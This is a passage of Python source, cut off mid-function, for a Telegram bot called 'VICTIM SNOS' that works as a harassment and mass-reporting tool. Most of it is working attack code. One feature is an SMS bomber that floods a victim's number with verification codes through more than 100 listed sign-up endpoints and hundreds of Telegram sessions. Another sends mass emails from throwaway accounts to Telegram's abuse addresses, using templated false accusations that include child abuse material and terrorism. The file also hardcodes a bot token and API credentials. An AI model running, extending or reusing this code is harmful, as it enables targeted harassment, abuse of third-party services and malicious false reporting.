import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS = set()

MAX_SESSIONS = 400
SESSION_DELAY = 30
BOMBER_DELAY = 30

MAILTM_ACCOUNTS_COUNT = 50
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
BANNER_PATH = "banner.png"

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org',
    'stopca@telegram.org', 'ca@telegram.org'
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
]

# Расширенный список сайтов для бомбера (100+ сайтов)
BOMBER_WEBSITES = [
    # Соцсети
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vk.com/method/auth.restore", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymLogin", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mail.ru/oauth/token", "method": "POST", "phone_field": "phone"},
    {"url": "https://connect.mail.ru/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/auth/reg/portal", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rambler.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.livejournal.com/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.my.mail.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Мессенджеры
    {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
    {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.viber.com/pa/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.signal.org/v1/accounts/sms/code/request", "method": "POST", "phone_field": "number"},
    {"url": "https://api.line.me/v2/oauth/accessToken", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.agent.mail.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.discord.com/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.skype.com/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Доставка и такси
    {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dixy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auchan.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.metro-cc.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.globus.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.okey.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.city-mobil.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dostavista.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Банки
    {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/restore", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.raiffeisen.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gazprombank.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.open.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sovcombank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rosbank.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.unicredit.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mtsbank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.psbank.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Маркетплейсы
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.youla.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eldorado.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.kazanexpress.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sima-land.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yandex.market/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sbermegamarket.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Аптеки
    {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rigla.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.planetazdorovo.ru/auth/code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.stolichki.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.neopharm.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Телеком
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yota.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rostelecom.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ttk.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Госуслуги
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.nalog.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pfr.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.fssp.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Транспорт
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.s7.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pobeda.aero/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.uralairlines.ru/auth/send", "method": "POST", "phone_field": "phone"},
    
    # Бронирование
    {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.travel.yandex.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.onetwotrip.com/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Магазины
    {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.letu.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rivegauche.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.zara.com/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.hm.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ikea.com/ru/ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.leroymerlin.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.petrovich.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Развлечения
    {"url": "https://api.kinopoisk.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ivi.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.okko.tv/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.more.tv/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.litres.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.bookmate.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Спорт
    {"url": "https://api.sport24.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.championat.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.fitness.ru/auth/send", "method": "POST", "phone_field": "phone"},
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

sessions_pool = []
sessions_ready = False

class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ComplaintAccountState(StatesGroup):
    waiting_choice = State()
    waiting_username = State()
    waiting_id = State()
    waiting_reason = State()

class ComplaintChannelState(StatesGroup):
    waiting_choice = State()
    waiting_channel = State()
    waiting_violation = State()

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)

        if user_id and user_id != ADMIN_ID and user_id not in ALLOWED_USERS:
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав!", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав!")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except:
            pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"snoser{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(
                f"{self.base_url}/accounts",
                json=account_data,
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()
                    
                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                    
                    async with self.session.post(
                        f"{self.base_url}/token",
                        json=login_data,
                        headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"]
                            }
        except:
            pass
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(1.5)
        self.accounts = accounts
        self.ready = True
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            email_data = {
                "from": account["email"],
                "to": [to_email],
                "subject": subject,
                "text": body
            }
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }
            async with self.session.post(
                f"{self.base_url}/messages",
                json=email_data,
                headers=headers
            ) as resp:
                return resp.status in [200, 201, 202]
        except:
            return False


# ---------- СЕССИИ PYROGRAM ----------
async def init_single_session(idx: int) -> dict:
    session_file = f"sessions/pool_{idx}"
    try:
        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except:
        return None


async def init_sessions_background():
    global sessions_pool, sessions_ready
    logger.info(f"Загрузка {MAX_SESSIONS} сессий...")
    os.makedirs("sessions", exist_ok=True)
    
    batch_size = 50
    for i in range(0, MAX_SESSIONS, batch_size):
        tasks = [init_single_session(j) for j in range(i, min(i + batch_size, MAX_SESSIONS))]
        results = await asyncio.gather(*tasks)
        for r in results:
            if r:
                sessions_pool.append(r)
        logger.info(f"Загружено {len(sessions_pool)}/{MAX_SESSIONS}")
        await asyncio.sleep(1)
    
    sessions_ready = True
    logger.info(f"Сессии готовы: {len(sessions_pool)}")


async def get_available_session() -> dict:
    current_time = time.time()
    available = []
    for s in sessions_pool:
        if not s["in_use"] and s["flood_until"] < current_time:
            if current_time - s["last_used"] >= SESSION_DELAY:
                available.append(s)
    if available:
        s = random.choice(available)
        s["in_use"] = True
        s["last_used"] = current_time
        return s
    return None


def release_session(s: dict):
    if s:
        s["in_use"] = False


# ---------- АТАКИ ----------
async def send_sms(phone: str) -> dict:
    s = await get_available_session()
    if not s:
        return {"success": False, "error": "Нет сессий"}
    try:
        if not s["client"].is_connected:
            await s["client"].connect()
        await s["client"].send_code(phone)
        release_session(s)
        return {"success": True}
    except FloodWait as e:
        s["flood_until"] = time.time() + e.value
        release_session(s)
        return {"success": False, "flood": e.value}
    except Exception as e:
        release_session(s)
        return {"success": False, "error": str(e)[:30]}


async def send_bomber(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
    payload = {site["phone_field"]: phone}
    try:
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=payload, timeout=5, ssl=False) as resp:
                return {"site": site["url"].split('/')[2], "success": True}
        else:
            async with session.get(site["url"], headers=headers, params=payload, timeout=5, ssl=False) as resp:
                return {"site": site["url"].split('/')[2], "success": True}
    except:
        return {"site": site["url"].split('/')[2], "success": False}


async def combined_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    results, ok, err = [], 0, 0
    connector = aiohttp.TCPConnector(limit=300, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            tasks = []
            for site in BOMBER_WEBSITES:
                for _ in range(2):
                    tasks.append(send_bomber(sess, phone, site))
            for _ in range(min(50, len(sessions_pool))):
                tasks.append(send_sms(phone))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get("success"):
                        ok += 1
                    else:
                        err += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok, err)
            
            if rnd < rounds:
                await asyncio.sleep(BOMBER_DELAY)
    
    return results, ok, err


# ---------- ЖАЛОБЫ ----------
COMPLAINT_TEXTS_ACCOUNT = {
    "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
    "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
}

COMPLAINT_TEXTS_CHANNEL = {
    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки."
}


async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str) -> int:
    if not mail_tm.accounts:
        return 0
    
    sent = 0
    sem = asyncio.Semaphore(15)
    
    async def send_one(acc, rec):
        async with sem:
            r = await mail_tm.send_email(acc, rec, subject, body)
            await asyncio.sleep(1)
            return r
    
    tasks = []
    for acc in mail_tm.accounts[:30]:
        for rec in RECEIVERS[:4]:
            tasks.append(send_one(acc, rec))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ---------- ОТЧЕТ ----------
def generate_report(phone: str, results: list, ok: int, err: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ",
        "=" * 50,
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Сайтов: {len(BOMBER_WEBSITES)}",
        f"Сессий: {len(sessions_pool)}",
        f"Успешно: {ok}",
        f"Ошибок: {err}",
        "=" * 50
    ]
    return "\n".join(lines)


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="АТАКА ПО НОМЕРУ", callback_data="attack")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="comp_acc")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="comp_chan")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop")
    builder.adjust(1)
    return builder.as_markup()


def get_account_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="1.1 Обычная жалоба", callback_data="acc_1.1")
    builder.button(text="1.2 Снос сессий", callback_data="acc_1.2")
    builder.button(text="1.3 Виртуальный номер", callback_data="acc_1.3")
    builder.button(text="1.4 Ссылка в био", callback_data="acc_1.4")
    builder.button(text="1.5 Спам с премиумом", callback_data="acc_1.5")
    builder.button(text="Назад", callback_data="comp_acc_back")
    builder.adjust(1)
    return builder.as_markup()


def get_channel_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="8. Личные данные", callback_data="chan_8")
    builder.button(text="9. Доксинг/Сваттинг", callback_data="chan_9")
    builder.button(text="10. Терроризм", callback_data="chan_10")
    builder.button(text="11. Детская порнография", callback_data="chan_11")
    builder.button(text="12. Мошенничество", callback_data="chan_12")
    builder.button(text="13. Продажа вирт номеров", callback_data="chan_13")
    builder.button(text="14. Расчлененка/Убийства", callback_data="chan_14")
    builder.button(text="15. Живодерство", callback_data="chan_15")
    builder.button(text="Назад", callback_data="comp_chan_back")
    builder.adjust(1)
    return builder.as_markup()


async def send_banner(msg: types.Message, caption: str, markup=None):
    if os.path.exists(BANNER_PATH):
        await msg.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=markup)
    else:
        await msg.answer(caption, reply_markup=markup)


async def edit_banner(cb: types.CallbackQuery, caption: str, markup=None):
    await cb.message.delete()
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=markup)
    else:
        await cb.message.answer(caption, reply_markup=markup)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    await send_banner(
        msg,
        f"<b>VICTIM SNOS v5.0</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} {'[ГОТОВ]' if sessions_ready else '[ЗАГРУЗКА]'}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} {'[ГОТОВ]' if mail_tm.ready else '[ЗАГРУЗКА]'}\n"
        f"Сайтов: {len(BOMBER_WEBSITES)}\n\n"
        "Выберите действие:",
        get_main_menu()
    )


@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_banner(
        cb,
        f"<b>VICTIM SNOS</b>\n\nСессии: {len(sessions_pool)}/{MAX_SESSIONS}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\nСайтов: {len(BOMBER_WEBSITES)}",
        get_main_menu()
    )
    await cb.answer()


@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    await edit_banner(
        cb,
        f"<b>СТАТУС</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} ({'Готов' if sessions_ready else 'Загрузка'})\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({'Готов' if mail_tm.ready else 'Загрузка'})\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
        f"Задержка SMS: {SESSION_DELAY}с",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="main_menu")]])
    )
    await cb.answer()


@dp.callback_query(F.data == "attack")
async def attack_start(cb: types.CallbackQuery, state: FSMContext):
    if not sessions_ready:
        await cb.answer("Сессии загружаются!", show_alert=True)
        return
    await state.set_state(AttackState.waiting_phone)
    await cb.message.edit_text(
        "<b>АТАКА ПО НОМЕРУ</b>\n\nВведите номер (+79001234567):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="main_menu")]])
    )
    await cb.answer()


@dp.message(StateFilter(AttackState.waiting_phone))
async def attack_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    await msg.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")


@dp.message(StateFilter(AttackState.waiting_count))
async def attack_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 5:
            await msg.answer("Введите число от 1 до 5!")
            return
    except:
        await msg.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    await state.clear()
    
    st = await msg.answer(f"<b>АТАКА ЗАПУЩЕНА</b>\n\nНомер: {phone}\nРаундов: {count}\nСайтов: {len(BOMBER_WEBSITES)}")
    
    async def prog(cur, tot, ok, err):
        try:
            await st.edit_text(f"<b>АТАКА</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nУспешно: {ok}\nОшибок: {err}")
        except:
            pass
    
    results, ok, err = await combined_attack(phone, count, prog)
    report = generate_report(phone, results, ok, err)
    
    fn = f"report_{phone.replace('+', '')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await msg.answer_document(FSInputFile(fn), caption=f"Завершено! Успешно: {ok}")
    os.remove(fn)
    await st.delete()
    await send_banner(msg, "<b>Главное меню</b>", get_main_menu())


# Жалобы на аккаунт
@dp.callback_query(F.data == "comp_acc")
async def comp_acc_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("Почта загружается!", show_alert=True)
        return
    await edit_banner(cb, "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВыберите тип жалобы:", get_account_complaint_menu())
    await cb.answer()


@dp.callback_query(F.data == "comp_acc_back")
async def comp_acc_back(cb: types.CallbackQuery):
    await edit_banner(
        cb,
